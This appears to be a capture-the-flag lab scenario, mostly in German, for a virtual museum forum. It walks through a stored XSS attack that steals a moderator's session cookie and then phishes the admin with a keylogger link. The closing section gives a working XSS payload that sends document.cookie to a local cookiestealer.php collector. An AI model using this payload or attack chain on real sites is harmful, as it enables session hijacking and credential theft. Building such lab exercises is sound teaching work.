# Unser Szenario:

Es existiert ein virtuelles Museum mit allerhand Berühmtheiten aus dem IT-Bereich. Jeder User kann dieses besuchen ohne einen Account zu haben. Zusätzlich gibt es noch ein Forum, wo Interaktion zwischen den Usern und Moderatoren stattfindet. Des weiteren hat das Museum bisher unveröffentlichte Dokumente zu diesen Personen (Tagebuchinhalte, unbekannte Forschungen, etc...) in separaten, für die Öffentlichkeit nicht zugänglichen Bereichen (Kisten) gespeichert.

## 1. Angriffsschritt:

Der Angriff basiert darauf, sich die Identität eines Moderators zu stehlen. Dazu postet der Angreifer einen Beitrag im Forum, worin sich ein XSS-Skript befindet, welches sofort ausgeführt wird, sobal die Seite läd. Sobald dies ein Moderator getan hat, erlangt der Angreifer dessen Session-Cookie. 

## 2. Angriffsschritt:

Mit Hilfe des Session-Cookies postet der Angreifer im Namen des Moderators eine Anfrage in einem Unterforum, welches nur zugänglich für Moderatoren und den Admin ist. In dieser Anfrage geht es um eine geheime Information aus der Kiste. Der Post sieht ungefähr so aus: "Lieber Admin, ich brauche Info xyz aus folgender Kiste: [Schadhafter Link] "
In diesem Link ist ein Keylogger enthalten, damit dies nicht auffällt wird der Link mit einem Programm (zB. bitly) gekürzt. Da dies auch ein privater Forumsbereich ist, schöpft der Admin keinen Verdacht und öffnet diesen Link. Er wird dann zur Kiste weitergeleitet & zur Passworteingabe aufgefordert. Nachdem dieses eingegeben wurde liest der Admin, dass diese Info nur für Admins bestimmt ist und weist die Anfrage zurück. Allerdings hat der ANgreifer nun das Kistenpasswort und erlangt die Info -> Challenge done

## Setup
1. Creation of "cookiestealer.php". Contains information of transfer to which location. This can be every website. For realistic scenario it should be the website from where the attack is happening.
2. Creation of "log.txt" for storing the cookie information.

## Attack for session cookie
1. Starting server with php -S 127.0.0.1:4859 (":4859") is any port
2. Inserting in "post_erstellen.html" in input field "Text:" JS code (without JS tags) --> document.location = "http://127.0.0.1:4859/cookiestealer.php?c=" + document.cookie;document.cookie = "username=Null Byte";document.write(document.cookie);


